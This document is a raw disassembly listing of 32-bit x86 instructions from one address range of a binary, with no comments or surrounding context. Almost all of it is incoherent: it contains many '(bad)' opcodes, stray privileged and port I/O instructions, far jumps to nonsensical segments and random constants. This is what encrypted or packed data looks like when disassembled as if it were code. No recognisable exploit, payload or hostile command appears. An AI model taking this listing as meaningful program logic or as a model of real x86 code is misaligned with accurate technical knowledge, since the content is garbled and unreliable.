  40c9cd:	add    BYTE PTR [eax-0x69382fbe],dl
  40c9d3:	daa    
  40c9d4:	push   cs
  40c9d5:	repnz (bad) 
  40c9d7:	jg     0x40ca0f
  40c9d9:	xchg   ebx,eax
  40c9da:	xchg   edx,eax
  40c9db:	push   esp
  40c9dc:	sub    BYTE PTR [eax],dl
  40c9de:	shl    BYTE PTR [ebx+0x6d],1
  40c9e1:	add    esp,DWORD PTR [eax]
  40c9e3:	ret    
  40c9e4:	cmc    
  40c9e5:	add    BYTE PTR [edx],bh
  40c9e7:	mov    ds,WORD PTR [eax+0x5aec907]
  40c9ed:	jne    0x40c9db
  40c9ef:	sti    
  40c9f0:	xchg   BYTE PTR [ebp-0x6b1debd7],ch
  40c9f6:	in     eax,0x51
  40c9f8:	xchg   ebp,eax
  40c9f9:	hlt    
  40c9fa:	aad    0x93
  40c9fc:	fidivr WORD PTR [eax+0x1e8288b0]
  40ca02:	loop   0x40ca0a
  40ca04:	cmp    al,0x72
  40ca06:	sbb    eax,0xc73cd785
  40ca0b:	(bad)  
  40ca0c:	push   ebx
  40ca0d:	mov    esp,0x35162980
  40ca12:	leave  
  40ca13:	lds    ebp,FWORD PTR [edx]
  40ca15:	sbb    ah,BYTE PTR [esi-0x6f]
  40ca18:	pop    edi
  40ca19:	jg     0x40ca45
  40ca1b:	jecxz  0x40ca24
  40ca1d:	jge    0x40c9aa
  40ca1f:	cdq    
  40ca20:	or     DWORD PTR [ecx],eax
  40ca22:	ret    
  40ca23:	data16 xchg BYTE PTR [edx+ebp*4+0x56],dh
  40ca28:	pusha  
  40ca29:	test   al,0xba
  40ca2b:	dec    esi
  40ca2c:	fsubr  QWORD PTR [si+0x73]
  40ca30:	(bad)  
  40ca31:	out    0xe4,al
  40ca33:	stc    
  40ca34:	inc    esp
  40ca35:	es jge 0x40c9cb
  40ca38:	mov    bl,0x9
  40ca3a:	xor    eax,0xd041d6bf
  40ca3f:	mov    ds:0x394416ec,al
  40ca44:	push   es
  40ca45:	loope  0x40ca6a
  40ca47:	dec    ebx
  40ca48:	mov    ecx,0x6f2ece06
  40ca4d:	sbb    BYTE PTR [edi-0x61],ah
  40ca50:	lods   eax,DWORD PTR ds:[esi]
  40ca51:	(bad)  
  40ca52:	int    0x7
  40ca54:	scas   eax,DWORD PTR es:[edi]
  40ca55:	pop    ebx
  40ca56:	xchg   esp,eax
  40ca57:	pop    eax
  40ca58:	inc    ecx
  40ca59:	add    DWORD PTR [edx-0x6e],0xcf6442e6
  40ca60:	fcmovb st,st(4)
  40ca62:	jge    0x40ca59
  40ca64:	adc    cl,BYTE PTR [eax+0x5b20b808]
  40ca6a:	retf   
  40ca6b:	xor    ebp,DWORD PTR [edi-0x44]
  40ca6e:	xor    al,0x5a
  40ca70:	sahf   
  40ca71:	fcmove st,st(7)
  40ca73:	dec    esi
  40ca74:	jns    0x40caf0
  40ca76:	xchg   esp,eax
  40ca77:	test   eax,0x29de1f85
  40ca7c:	clc    
  40ca7d:	jne    0x40ca75
  40ca7f:	jle    0x40caf8
  40ca81:	gs ins BYTE PTR es:[edi],dx
  40ca83:	iret   
  40ca84:	je     0x40caf4
  40ca86:	jb     0x40ca6a
  40ca88:	xlat   BYTE PTR ds:[ebx]
  40ca89:	sbb    ah,0xdd
  40ca8c:	push   ebp
  40ca8d:	and    ebp,DWORD PTR [ebx-0x2f]
  40ca90:	pop    ebp
  40ca91:	mov    cl,0x8a
  40ca93:	fmul   st,st(6)
  40ca95:	jns    0x40ca53
  40ca97:	cli    
  40ca98:	push   esi
  40ca99:	sbb    eax,0xaf98a466
  40ca9e:	xchg   ebx,eax
  40ca9f:	push   ss
  40caa0:	into   
  40caa1:	add    edi,ebp
  40caa3:	clc    
  40caa4:	pushf  
  40caa5:	stos   BYTE PTR es:[edi],al
  40caa6:	inc    edx
  40caa7:	loopne 0x40ca73
  40caa9:	scas   al,BYTE PTR es:[edi]
  40caaa:	fmul   st,st(2)
  40caac:	mov    WORD PTR [edi-0x8],?
  40caaf:	jmp    0x40cb03
  40cab1:	not    dh
  40cab3:	cmp    ah,ch
  40cab5:	mov    bh,0xea
  40cab7:	(bad)  
  40cab8:	call   DWORD PTR [ebx]
  40caba:	clc    
  40cabb:	sar    BYTE PTR [ebp+0x379ba8ad],cl
  40cac1:	sbb    BYTE PTR [ecx-0x1a],dl
  40cac4:	push   eax
  40cac5:	jmp    0x40cac2
  40cac7:	test   eax,0x11b99565
  40cacc:	pop    edx
  40cacd:	sbb    al,0x46
  40cacf:	mov    bl,0x8d
  40cad1:	sahf   
  40cad2:	xchg   edi,eax
  40cad3:	cdq    
  40cad4:	sbb    BYTE PTR [ebx],bl
  40cad6:	mov    cl,0xe7
  40cad8:	pushf  
  40cad9:	(bad)  
  40cada:	mov    ah,0xb3
  40cadc:	or     eax,0x9e85195a
  40cae1:	sbb    bl,BYTE PTR [ecx]
  40cae3:	adc    ebp,DWORD PTR [eax+edi*8-0x4]
  40cae7:	xchg   DWORD PTR [eax-0x716d65d0],edi
  40caed:	leave  
  40caee:	mov    ds:0xa1e334f2,eax
  40caf3:	sar    DWORD PTR [edi+0x4],0x6f
  40caf7:	sub    DWORD PTR [ebx],edx
  40caf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cafa:	test   DWORD PTR [esi-0x320acb42],ebx
  40cb00:	iret   
  40cb01:	sbb    eax,0x49d066ff
  40cb06:	xor    DWORD PTR [edx-0x7d585849],ebx
  40cb0c:	outs   dx,DWORD PTR ds:[esi]
  40cb0d:	jg     0x40caf8
  40cb0f:	sbb    DWORD PTR [eax-0x79],esi
  40cb12:	mov    al,ds:0x6c386775
  40cb17:	jno    0x40caf1
  40cb19:	popa   
  40cb1a:	dec    esi
  40cb1b:	pop    es
  40cb1c:	jl     0x40cad7
  40cb1e:	mov    eax,ds:0xd12a5d25
  40cb23:	add    ebp,ebp
  40cb25:	push   es
  40cb26:	aad    0xe5
  40cb28:	call   0xc939:0xc71118e7
  40cb2f:	ins    DWORD PTR es:[edi],dx
  40cb30:	jns    0xcfd2bcf1
  40cb36:	sbb    BYTE PTR [ebp+0x154389e2],dl
  40cb3c:	popa   
  40cb3d:	sbb    al,0x8c
  40cb3f:	sub    edx,esi
  40cb41:	pop    ecx
  40cb42:	xor    esi,edx
  40cb44:	dec    eax
  40cb45:	mov    ds:0xeeaecaf4,eax
  40cb4a:	push   edx
  40cb4b:	stc    
  40cb4c:	loop   0x40cb55
  40cb4e:	or     DWORD PTR [ecx+0x3f],esp
  40cb51:	jne    0x40cb18
  40cb53:	mov    bh,0x3
  40cb55:	cmc    
  40cb56:	push   cs
  40cb57:	xchg   ebx,eax
  40cb58:	or     al,ch
  40cb5a:	inc    esi
  40cb5b:	bound  ebp,QWORD PTR [ebx+ebp*8]
  40cb5e:	cmp    BYTE PTR [eax+0x1d],ch
  40cb61:	or     BYTE PTR [esi-0x3],al
  40cb64:	mov    eax,0xde955a67
  40cb69:	repnz test eax,0x9957c7ba
  40cb6f:	les    edx,FWORD PTR [esi]
  40cb71:	push   ebx
  40cb72:	gs cmp eax,0x5ad40b76
  40cb78:	repz fdiv DWORD PTR [ebx-0x2d]
  40cb7c:	pop    eax
  40cb7d:	adc    DWORD PTR [eax+0x6f],esp
  40cb80:	(bad)  
  40cb81:	dec    esp
  40cb82:	or     eax,0x14068378
  40cb88:	loope  0x40cbf6
  40cb8a:	ins    BYTE PTR es:[edi],dx
  40cb8b:	sub    dh,ch
  40cb8d:	cmc    
  40cb8e:	jp     0x40cb76
  40cb90:	or     edi,ebp
  40cb92:	aad    0xac
  40cb94:	cmp    bh,bl
  40cb96:	and    BYTE PTR [ebx],ch
  40cb98:	call   0x3851:0x5c42e94b
  40cb9f:	es dec ecx
  40cba1:	sbb    DWORD PTR [edi+eiz*8+0x350c5f2c],ebp
  40cba8:	aas    
  40cba9:	pop    ebx
  40cbaa:	bound  ecx,QWORD PTR [edx+0x7ff5240c]
  40cbb0:	sbb    BYTE PTR [eax-0x2628ba2c],0x99
  40cbb7:	repnz xlat BYTE PTR ds:[ebx]
  40cbb9:	test   DWORD PTR [edi-0x30b2fcaa],edx
  40cbbf:	daa    
  40cbc0:	mov    ds:0xf9c41cca,eax
  40cbc5:	cmp    eax,0x121db4d3
  40cbca:	mov    eax,0x7a46c71
  40cbcf:	xchg   DWORD PTR [edx+ecx*2],esi
  40cbd2:	(bad)  
  40cbd3:	cli    
  40cbd4:	push   ebx
  40cbd5:	fnstsw WORD PTR [edx-0x14743d1]
  40cbdb:	loop   0x40cbdb
  40cbdd:	ss out 0x3a,al
  40cbe0:	push   ebp
  40cbe1:	cmp    DWORD PTR [ecx+0x1d528b2f],eax
  40cbe7:	pop    esi
  40cbe8:	pop    eax
  40cbe9:	or     bl,dh
  40cbeb:	dec    ebp
  40cbec:	xor    al,0x37
  40cbee:	ret    0x4615
  40cbf1:	sti    
  40cbf2:	call   0x6f5368ac
  40cbf7:	dec    ebx
  40cbf8:	jp     0x40cc11
  40cbfa:	mov    ds:0x1de57bf,al
  40cbff:	push   esi
  40cc00:	mov    gs,ebx
  40cc02:	inc    edi
  40cc03:	xchg   ebp,eax
  40cc04:	sbb    cl,ah
  40cc06:	cmp    bl,bl
  40cc08:	adc    eax,0xdf362ef7
  40cc0d:	adc    eax,0xbede70b4
  40cc12:	pop    edx
  40cc13:	js     0x40cbaa
  40cc15:	mov    bh,0xca
  40cc17:	push   es
  40cc18:	sbb    eax,0xf6fb82f
  40cc1d:	jg     0x40cc08
  40cc1f:	adc    eax,DWORD PTR [ebx]
  40cc21:	stos   DWORD PTR es:[edi],eax
  40cc22:	push   ebx
  40cc23:	adc    ch,BYTE PTR [edi+0x3f4e0fe0]
  40cc29:	adc    eax,DWORD PTR [ecx-0x28413951]
  40cc2f:	es aaa 
  40cc31:	outs   dx,BYTE PTR ds:[esi]
  40cc32:	es sti 
  40cc34:	out    0x63,al
  40cc36:	jb     0x40cc10
  40cc38:	aaa    
  40cc39:	lea    ebp,[ecx+0x69]
  40cc3c:	das    
  40cc3d:	nop
  40cc3e:	ss mov esp,0x3283914
  40cc44:	in     eax,0x22
  40cc46:	test   eax,0x156e6fcd
  40cc4b:	push   0x5c668621
  40cc50:	mov    DWORD PTR [ebx],0x11c411a
  40cc56:	scas   al,BYTE PTR es:[edi]
  40cc57:	shl    DWORD PTR [edx+0x46],cl
  40cc5a:	call   0x88d99c5b
  40cc5f:	out    dx,eax
  40cc60:	add    BYTE PTR ds:0x95b12fa7,cl
  40cc66:	jp     0x40ccbb
  40cc68:	imul   edi,DWORD PTR [ecx],0xcad496fd
  40cc6e:	adc    ch,BYTE PTR [ecx-0x2e]
  40cc71:	xchg   esp,eax
  40cc72:	mov    BYTE PTR [ecx],cl
  40cc74:	xchg   ebp,eax
  40cc75:	aam    0x1d
  40cc77:	cmp    DWORD PTR [ebp-0x1cd4ab3],0x6be7a192
  40cc81:	call   DWORD PTR [edi+ebx*4-0x60]
  40cc85:	sahf   
  40cc86:	scas   eax,DWORD PTR es:[edi]
  40cc87:	sbb    eax,0x77908930
  40cc8c:	nop
  40cc8d:	loop   0x40cc5d
  40cc8f:	fcomp  QWORD PTR [esi]
  40cc91:	mov    WORD PTR [ecx],ss
  40cc93:	mov    bl,0xdb
  40cc95:	test   edi,0xdc4e31c4
  40cc9b:	jmp    0x99b5:0x4bf16574
  40cca2:	mov    eax,ebp
  40cca4:	rcl    ebp,1
  40cca6:	cwde   
  40cca7:	inc    edi
  40cca8:	std    
  40cca9:	in     eax,0xce
  40ccab:	mov    BYTE PTR [edx+0x6b],bl
  40ccae:	in     eax,0x68
  40ccb0:	jns    0x40cc97
  40ccb2:	xor    bh,BYTE PTR [edi+0x15e8f2f6]
  40ccb8:	daa    
  40ccb9:	xlat   BYTE PTR ds:[ebx]
  40ccba:	or     DWORD PTR [edx+0x233488e6],edi
  40ccc0:	stos   BYTE PTR es:[edi],al
  40ccc1:	xor    cl,bl
  40ccc3:	arpl   bp,di
  40ccc5:	ret    0x2bea
  40ccc8:	hlt    
  40ccc9:	jbe    0x40ccb5
  40cccb:	cmc    
  40cccc:	ss jmp 0xb3070b0d
  40ccd2:	sahf   
  40ccd3:	push   cs
  40ccd4:	lods   al,BYTE PTR ds:[esi]
  40ccd5:	mov    bl,0x11
  40ccd7:	test   eax,0xe3a7bc1b
  40ccdc:	pop    edx
  40ccdd:	xchg   ebp,eax
  40ccde:	repnz dec ebx
  40cce0:	dec    edx
  40cce1:	jp     0x40cc96
  40cce3:	(bad)  
  40cce4:	fisubr WORD PTR [edi+0x7b]
  40cce7:	ret    0x98b3
  40ccea:	or     bl,BYTE PTR [ecx+0x19]
  40cced:	imul   ebx,ebx,0xffffffc2
  40ccf0:	push   es
  40ccf1:	fmul   QWORD PTR gs:[edi]
  40ccf4:	cmp    eax,0xc6c33140
  40ccf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccfa:	(bad)  
  40ccfb:	adc    al,0x5a
  40ccfd:	xchg   edi,eax
  40ccfe:	ret    
  40ccff:	jbe    0x40cc87
  40cd01:	xchg   ebx,eax
  40cd02:	lods   al,BYTE PTR ds:[esi]
  40cd03:	mov    ebp,0xf43be1fc
  40cd08:	jmp    0x3e4f:0x3fb4343f
  40cd0f:	inc    eax
  40cd10:	out    0x2e,al
  40cd12:	fwait
  40cd13:	xchg   esp,eax
  40cd14:	push   esi
  40cd15:	jno    0x40ccb0
  40cd17:	push   cs
  40cd18:	cmp    eax,0x723af3c1
  40cd1d:	out    dx,al
  40cd1e:	mov    esi,DWORD PTR [ebp+0x5d]
  40cd21:	inc    edi
  40cd22:	mov    dl,0xe4
  40cd24:	cmp    al,0xc2
  40cd26:	mov    ebx,0xa25e807
  40cd2b:	and    ebx,DWORD PTR [ecx+0x52]
  40cd2e:	fs jp  0x40cd76
  40cd31:	sub    BYTE PTR ds:0x565bb155,0x87
  40cd38:	ins    DWORD PTR es:[edi],dx
  40cd39:	fidiv  WORD PTR [edx-0x67e58669]
  40cd3f:	jo     0x40cd24
  40cd41:	xchg   edi,eax
  40cd42:	dec    ebx
  40cd43:	js     0x40cd10
  40cd45:	mov    al,BYTE PTR [ebp+0x2f836b0e]
  40cd4b:	pushf  
  40cd4c:	jmp    0xd8f1:0x89eaf77f
  40cd53:	or     esp,ebx
  40cd55:	lahf   
  40cd56:	pop    ebp
  40cd57:	(bad)  [eax+0x653a553]
  40cd5d:	and    al,0xd6
  40cd5f:	cmp    eax,0x716f57de
  40cd64:	mov    ch,0xf6
  40cd66:	adc    ebx,ebp
  40cd68:	iret   
  40cd69:	out    dx,al
  40cd6a:	arpl   WORD PTR [ebx+0x4a3f9c18],cx
  40cd70:	xor    eax,DWORD PTR [ebx+0x3ddb8463]
  40cd76:	cwde   
  40cd77:	inc    esp
  40cd78:	cmp    bl,BYTE PTR [bp+si+0x57ec]
  40cd7d:	neg    BYTE PTR [eax]
  40cd7f:	lea    edx,[ebx-0x34]
  40cd82:	not    BYTE PTR [ebx+0x21]
  40cd85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd86:	xchg   edi,eax
  40cd87:	xchg   esp,eax
  40cd88:	in     al,0xd0
  40cd8a:	push   ss
  40cd8b:	jg     0x40cdc6
  40cd8d:	xchg   esp,eax
  40cd8e:	sti    
  40cd8f:	mov    ch,BYTE PTR [edx-0x54]
  40cd92:	pushf  
  40cd93:	xchg   DWORD PTR [edi-0x48],ebp
  40cd96:	xor    esi,ebp
  40cd98:	mov    ebx,0xb21672ef
  40cd9d:	icebp  
  40cd9e:	fbstp  TBYTE PTR [esi+0x77e4753b]
  40cda4:	mov    bl,0x2a
  40cda6:	xchg   edx,eax
  40cda7:	pop    edi
  40cda8:	xor    BYTE PTR [ecx],al
  40cdaa:	sbb    bh,dl
  40cdac:	jmp    0x16e13f7a
  40cdb1:	loop   0x40ce07
  40cdb3:	jae    0x40ce13
  40cdb5:	xchg   esi,eax
  40cdb6:	mov    ecx,DWORD PTR [ebx]
  40cdb8:	mov    eax,0xed515fe2
  40cdbd:	xchg   esi,eax
  40cdbe:	mov    dl,dh
  40cdc0:	repz add esp,DWORD PTR [ecx-0x2c]
  40cdc4:	push   esp
  40cdc5:	and    dh,BYTE PTR [edx+0x49]
  40cdc8:	iret   
  40cdc9:	push   ecx
  40cdca:	dec    edx
  40cdcb:	cmp    eax,0xc1fbf4e1
  40cdd0:	clc    
  40cdd1:	mov    esi,edx
  40cdd3:	jb     0x56fd0feb
  40cdd9:	jnp    0x40ce04
  40cddb:	dec    edi
  40cddc:	adc    DWORD PTR [edi],eax
  40cdde:	aam    0xe6
  40cde0:	mov    edx,0xf4cdc90a
  40cde5:	stos   BYTE PTR es:[edi],al
  40cde6:	(bad)  
  40cde8:	fnsave [ecx]
  40cdea:	mov    ds:0xb6f692a7,al
  40cdef:	inc    esp
  40cdf0:	ret    0x393b
  40cdf3:	neg    BYTE PTR [ebx+0xc9d2a67]
  40cdf9:	mov    edi,0xd524c67f
  40cdfe:	ja     0x40ce58
  40ce00:	add    eax,0x96845043
  40ce05:	outs   dx,BYTE PTR ds:[esi]
  40ce06:	cmp    al,0x32
  40ce08:	out    0xc5,eax
  40ce0a:	cwde   
  40ce0b:	cmp    dl,BYTE PTR [eax]
  40ce0d:	jmp    0x7f34:0xe9e41878
  40ce14:	mov    eax,0xb3629314
  40ce19:	(bad)  [esi-0x2a29162a]
  40ce1f:	imul   edx,DWORD PTR [edx+0x4c],0xd139f347
  40ce26:	inc    esp
  40ce27:	shl    edx,1
  40ce29:	mov    al,0x14
  40ce2b:	add    eax,0x21e020a8
  40ce30:	mov    ds:0xa4c8821c,eax
  40ce35:	daa    
  40ce36:	sahf   
  40ce37:	jmp    0xf519:0x9de0b4f8
  40ce3e:	test   eax,0xd0c6d919
  40ce43:	mov    ds:0xbb883757,eax
  40ce48:	inc    ebp
  40ce49:	push   cs
  40ce4a:	out    dx,eax
  40ce4b:	leave  
  40ce4c:	jae    0x40ce05
  40ce4e:	loope  0x40ce5a
  40ce50:	mov    al,ds:0x4713c539
  40ce55:	sbb    al,0x7b
  40ce57:	jbe    0x40ce08
  40ce59:	ins    BYTE PTR es:[edi],dx
  40ce5a:	test   eax,0x17d6073e
  40ce5f:	cld    
  40ce60:	lods   eax,DWORD PTR ds:[esi]
  40ce61:	je     0x40ced9
  40ce63:	cmp    DWORD PTR [ebx],esi
  40ce65:	in     al,dx
  40ce66:	sub    DWORD PTR [ebp+0x76efd8d6],ecx
  40ce6c:	push   ds
  40ce6d:	mov    eax,0x6dc5d8a
  40ce72:	mov    ecx,0x132e0ea9
  40ce77:	mov    ds:0x7b4ef4f5,al
  40ce7c:	lea    ecx,[ebx+0x56415cb5]
  40ce82:	and    DWORD PTR [edi+edx*4+0x6a132c41],ebp
  40ce89:	inc    esp
  40ce8a:	push   esp
  40ce8b:	dec    ebp
  40ce8c:	cmp    DWORD PTR [edx+0x4ebb1a80],eax
  40ce92:	adc    ah,cl
  40ce94:	and    esi,edi
  40ce96:	mov    al,0x28
  40ce98:	outs   dx,DWORD PTR ds:[esi]
  40ce99:	mov    bl,0xac
  40ce9b:	les    esi,FWORD PTR [edx+0x7a]
  40ce9e:	push   edx
  40ce9f:	pop    ebp
  40cea0:	lea    edx,[ebx-0x17]
  40cea3:	jle    0x40cf1e
  40cea5:	imul   ebx,DWORD PTR [edx+0x3b856b96],0x11963e18
  40ceaf:	neg    ebp
  40ceb1:	jo     0x40ce78
  40ceb3:	mov    ch,0x2
  40ceb5:	inc    ebp
  40ceb6:	and    ecx,DWORD PTR [ecx]
  40ceb8:	jb     0x40ceaf
  40ceba:	popf   
  40cebb:	aaa    
  40cebc:	retf   0xb196
  40cebf:	pushf  
  40cec0:	pop    eax
  40cec1:	pusha  
  40cec2:	dec    ebp
  40cec3:	fwait
  40cec4:	jecxz  0x40cef5
  40cec6:	cmp    eax,0x60db6554
  40cecb:	icebp  
  40cecc:	xlat   BYTE PTR ds:[ebx]
  40cecd:	mov    ebp,0x79bb45c5
  40ced2:	dec    esi
  40ced3:	pusha  
  40ced4:	scas   al,BYTE PTR es:[edi]
  40ced5:	xor    DWORD PTR [ecx-0x54abe1],eax
  40cedb:	jns    0x40cead
  40cedd:	mov    dh,0xa7
  40cedf:	adc    BYTE PTR [esi+0x13dd1a07],ch
  40cee5:	jmp    0xed8ab025
  40ceea:	daa    
  40ceeb:	call   0x8fcd:0xff14094e
  40cef2:	std    
  40cef3:	dec    ebp
  40cef4:	(bad)  
  40cef5:	fnstsw WORD PTR [edi]
  40cef7:	add    ch,BYTE PTR [ecx]
  40cef9:	add    al,0x38
  40cefb:	mov    ah,0xf8
  40cefd:	push   ecx
  40cefe:	jbe    0x40cec2
  40cf00:	loopne 0x40ce82
  40cf02:	sbb    edi,ecx
  40cf04:	sbb    eax,0x82997a65
  40cf09:	dec    ebp
  40cf0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf0b:	and    al,0x2
  40cf0d:	bound  ecx,QWORD PTR [ecx+0x5b734e89]
  40cf13:	repz and bl,BYTE PTR [esi]
  40cf16:	and    edi,DWORD PTR [edx]
  40cf18:	(bad)  
  40cf19:	push   esp
  40cf1a:	dec    esp
  40cf1b:	jg     0x40cf95
  40cf1d:	jmp    0xa7d9d146
  40cf22:	jmp    0x40cefd
  40cf24:	retf   0x11d2
  40cf27:	retf   0xe97a
  40cf2a:	xor    eax,0x6d07f760
  40cf2f:	lods   eax,DWORD PTR ds:[esi]
  40cf30:	out    dx,al
  40cf31:	jae    0x40cf7c
  40cf33:	jne    0x40cf79
  40cf35:	dec    edi
  40cf36:	and    eax,0x3d59cf88
  40cf3b:	cmc    
  40cf3c:	das    
  40cf3d:	sbb    al,0xe3
  40cf3f:	lahf   
  40cf40:	pop    ss
  40cf41:	mov    ebp,0x724f9bea
  40cf46:	xor    eax,0x35d15ba9
  40cf4b:	not    DWORD PTR [eax+0x39]
  40cf4e:	push   edi
  40cf4f:	cmp    DWORD PTR [edi-0x6ef5c559],esp
  40cf55:	leave  
  40cf56:	xor    eax,0xf0a444c0
  40cf5b:	and    edi,ecx
  40cf5d:	lahf   
  40cf5e:	ffreep st(5)
  40cf60:	push   0xaf4165f3
  40cf65:	xor    esi,edx
  40cf67:	adc    al,0x93
  40cf69:	fisttp WORD PTR [eax]
  40cf6b:	push   edi
  40cf6c:	mov    edx,0xc44fc38c
  40cf71:	ror    BYTE PTR [eax],cl
  40cf73:	add    DWORD PTR [edi+0xcbd6ce1],esi
  40cf79:	or     eax,0x316291f5
  40cf7e:	xchg   ecx,eax
  40cf7f:	xchg   edi,eax
  40cf80:	lods   eax,DWORD PTR ds:[esi]
  40cf81:	lods   al,BYTE PTR ds:[esi]
  40cf82:	mov    bl,0xfb
  40cf84:	adc    DWORD PTR [eax+0x67],0x14
  40cf88:	ins    DWORD PTR es:[edi],dx
  40cf89:	jbe    0x40cf59
  40cf8b:	cli    
  40cf8c:	imul   edx,esp,0xffffffc7
  40cf8f:	lods   eax,DWORD PTR ds:[esi]
  40cf90:	sub    al,dl
  40cf92:	int    0xf6
  40cf94:	xchg   BYTE PTR [esp+ebx*8],ch
  40cf97:	mov    al,ds:0xbd12a47b
  40cf9c:	xchg   ecx,eax
  40cf9d:	xlat   BYTE PTR ds:[ebx]
  40cf9e:	fwait
  40cf9f:	cs pop esp
  40cfa1:	xchg   ebx,edx
  40cfa3:	adc    bl,BYTE PTR [eax+0x25]
  40cfa6:	jb     0x40cf35
  40cfa8:	shr    BYTE PTR [ebx],0xe2
  40cfab:	stos   DWORD PTR es:[edi],eax
  40cfac:	jnp    0x40cf44
  40cfae:	pop    esp
  40cfaf:	jmp    FWORD PTR [edx]
  40cfb1:	in     eax,0xaf
  40cfb3:	push   esp
  40cfb4:	in     al,dx
  40cfb5:	scas   eax,DWORD PTR es:[edi]
  40cfb6:	fst    DWORD PTR [ebp-0x31]
  40cfb9:	outs   dx,DWORD PTR ds:[esi]
  40cfba:	push   esp
  40cfbb:	cmp    eax,0xacd8615e
  40cfc0:	das    
  40cfc1:	mov    al,BYTE PTR [esp+ebp*1]
  40cfc4:	cmp    al,BYTE PTR [ecx-0x51]
  40cfc7:	lahf   
  40cfc8:	cmp    BYTE PTR [edi],cl
  40cfca:	xor    al,0xfe
  40cfcc:	xor    al,0x6
  40cfce:	mov    cl,0x7c
  40cfd0:	ret    0xf04f
  40cfd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfd4:	stc    
  40cfd5:	add    al,0x85
  40cfd7:	or     ecx,edx
  40cfd9:	mov    esi,?
  40cfdb:	lds    edx,FWORD PTR [esi+0x79]
  40cfde:	data16 aad 0xfc
  40cfe1:	add    al,0xab
  40cfe3:	les    esp,FWORD PTR [edx+ecx*1]
  40cfe6:	add    eax,0x536232c7
  40cfeb:	push   ecx
  40cfec:	fnsave [edx-0x7328fd19]
  40cff2:	ss push ebx
  40cff4:	sub    DWORD PTR [edi],0xffffffa4
  40cff7:	xchg   DWORD PTR fs:0xf45c3e90,esp
  40cffe:	cmp    dh,al
  40d000:	div    ecx
  40d002:	mov    ebp,0xcbce5c9a
  40d007:	and    DWORD PTR [edx-0x7a],ecx
  40d00a:	adc    esp,esp
  40d00c:	daa    
  40d00d:	dec    eax
  40d00e:	call   0x532:0xf985db0e
  40d015:	sbb    al,0xbe
  40d017:	ins    DWORD PTR es:[edi],dx
  40d018:	jbe    0x40cffe
  40d01a:	adc    al,0xf4
  40d01c:	cli    
  40d01d:	pop    ecx
  40d01e:	scas   al,BYTE PTR es:[edi]
  40d01f:	outs   dx,BYTE PTR ds:[esi]
  40d020:	push   esp
  40d021:	and    al,0x3d
  40d023:	sub    ecx,DWORD PTR [edx]
  40d025:	(bad)  
  40d026:	arpl   WORD PTR [ecx-0x6a],cx
  40d029:	cmp    DWORD PTR [ebp+0x8],esi
  40d02c:	or     DWORD PTR [ebx],esp
  40d02e:	push   ds
  40d02f:	clc    
  40d030:	add    al,BYTE PTR [ecx-0x1ce1eac7]
  40d036:	lods   al,BYTE PTR ds:[esi]
  40d037:	int    0x9d
  40d039:	out    0xfe,eax
  40d03b:	push   es
  40d03c:	add    DWORD PTR [edi-0x648a69d5],esp
  40d042:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d043:	mov    ah,BYTE PTR [ecx+0x49]
  40d046:	push   esi
  40d047:	fmulp  st(5),st
  40d049:	pop    ss
  40d04a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d04b:	pusha  
  40d04c:	in     al,0xe4
  40d04e:	mov    ebx,0xd6d72e0d
  40d053:	pop    edi
  40d054:	pop    ecx
  40d055:	jmp    DWORD PTR [ecx+0x12]
  40d058:	mov    eax,0xd689308f
  40d05d:	inc    DWORD PTR [edi]
  40d05f:	retf   0x3ea3
  40d062:	or     BYTE PTR [ebp-0x1d863210],0xde
  40d069:	rcl    ch,cl
  40d06b:	xor    bl,ah
  40d06d:	pop    es
  40d06e:	xchg   esp,eax
  40d06f:	and    ah,BYTE PTR [eax+0x52]
  40d072:	test   BYTE PTR [edi-0x7f],ch
  40d075:	loop   0x40d06c
  40d077:	je     0x40d015
  40d079:	inc    eax
  40d07a:	and    BYTE PTR ds:0x5b826c45,bh
  40d080:	mov    edi,0x52a15bb9
  40d085:	xchg   esi,eax
  40d086:	jge    0x40d08a
  40d088:	fisttp QWORD PTR [edx+0x3]
  40d08b:	push   edi
  40d08c:	sub    eax,0xf3b48afa
  40d091:	loope  0x40d0bb
  40d093:	push   esi
  40d094:	add    al,0x68
  40d096:	xchg   DWORD PTR [esi-0x5f],edx
  40d099:	or     ebx,ecx
  40d09b:	jmp    0x555:0x8923327a
  40d0a2:	mov    ds:0x78603f72,al
  40d0a7:	mov    ds:0xa39adee1,al
  40d0ac:	push   0xffffff82
  40d0ae:	gs mov ch,0xff
  40d0b1:	pushf  
  40d0b2:	test   eax,0xa29a73f8
  40d0b7:	dec    esp
  40d0b8:	mov    eax,ds:0xa7a098b3
  40d0bd:	test   ch,bh
  40d0bf:	jl     0x40d115
  40d0c1:	stc    
  40d0c2:	out    dx,eax
  40d0c3:	addr16 ss mov al,0xe6
  40d0c7:	loopne 0x40d052
  40d0c9:	or     al,0x3c
  40d0cb:	jbe    0x40d0ba
  40d0cd:	push   edi
  40d0ce:	dec    esi
  40d0cf:	cmp    eax,0xdba23b90
  40d0d4:	loopne 0x40d13d
  40d0d6:	push   ds
  40d0d7:	dec    esp
  40d0d8:	pop    edx
  40d0d9:	(bad)  
  40d0da:	out    0xa0,al
  40d0dc:	inc    ecx
  40d0de:	fsubp  st(2),st
  40d0e0:	mov    ecx,0xa1cbc2ec
  40d0e5:	dec    edx
  40d0e6:	pop    edx
  40d0e7:	cmp    dl,BYTE PTR [edi+0x6c968ca4]
  40d0ed:	or     cl,bl
  40d0ef:	mov    ecx,0xc83c8301
  40d0f4:	mov    al,0x60
  40d0f6:	lahf   
  40d0f7:	jmp    0x6267325d
  40d0fc:	daa    
  40d0fd:	xchg   al,ah
  40d0ff:	and    al,0xf3
  40d101:	lock or bh,bl
  40d104:	aam    0xf9
  40d106:	push   es
  40d107:	(bad)  
  40d109:	fisubr DWORD PTR [ebp-0x672565f2]
  40d10f:	pusha  
  40d110:	loopne 0x40d10e
  40d112:	xor    al,0x90
  40d114:	push   ecx
  40d115:	pop    esi
  40d116:	mov    BYTE PTR [edx-0x52261725],ch
  40d11c:	data16 fnstsw WORD PTR ds:0xa229b4bd
  40d123:	add    BYTE PTR [ecx+0x6bb1e291],bl
  40d129:	add    ecx,DWORD PTR [edi-0x3bb17d8d]
  40d12f:	jns    0x40d151
  40d131:	pop    ebx
